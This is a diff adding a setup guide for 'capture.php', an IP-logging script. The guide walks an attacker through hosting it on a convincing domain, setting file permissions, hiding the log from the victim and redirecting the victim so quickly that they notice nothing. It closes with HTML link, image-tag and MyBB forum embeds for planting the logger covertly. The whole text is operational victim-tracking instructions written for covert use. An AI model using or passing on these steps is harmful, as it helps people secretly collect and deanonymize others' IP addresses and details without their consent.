@@ -1,0 +1,52 @@
+-------------------------------------------------------------------------------------------
+              *** after setting up your convincing domain name / server *** 
+-------------------------------------------------------------------------------------------
+Step 1: upload 'capture.php' to your web server. This ip-logging
+        script can be renamed to fix whatever convincing file-naming
+        convention is desired by the attacker.
+
+        For most Linux/Unix distros, this script will be uploaded to: /var/www/html
+        Ensure your HTTP service is running! For Windows, this directory will be
+        different depending on which service is installed.
+-------------------------------------------------------------------------------------------
+Step 2: if not already, set permissions for your script to 'public'
+
+        LINUX/UNIX: sudo chmod 644 capture.php
+
+        WINDOWS: icacls capture.php /grant:r username:R /grant:r everyone:R
+-------------------------------------------------------------------------------------------
+Step 3: create an emtpy file called 'log.txt' in the same directory as
+        your script. You may want to modify this script so that the victim
+        cannot view the ip logs. This is optional.
+
+        LINUX/UNIX: sudo chmod 600 log.txt
+
+        WINDOWS: icacls log.txt /deny Everyone:(R,X) /grant "YOUR-USER/GROUP-HERE":(F)
+-------------------------------------------------------------------------------------------
+Step 4: modify your ip-logging script on line #4. This line contains a placeholder domain.
+        once the ip and other details about the victim has been logged, the script will
+        automatically redirect the victim to the true destination url. Replace www.example.com
+        with another domain of your choice.
+
+        Example: header('Location: www.github.com');
+-------------------------------------------------------------------------------------------
+Step 5: The effective ip-logger url of your script should be something like:
+
+        http://www.notstealingyourdata.com/capture.php
+
+        This will be the complete URL you'll send to a victim. The logging process will
+        happen so quickly (usually around 1 m/s) the victim has no idea what took place.
+        At the very least it will look like their connection stalled for a second before
+        being sent to your destination url.
+-------------------------------------------------------------------------------------------
+TIPS:
+
+Hyperlink your logger using HTML embedding:
+        <a href="www.site.com/capture.php">Click me!</a>
+
+If your logger points to an image (image logger opposed to a standard ip logger):
+        <img src="www.site.com/capture.php">
+
+        Or using MyBB forum formatting:
+         [IMG]www.site.com/capture.php[/IMG]
+
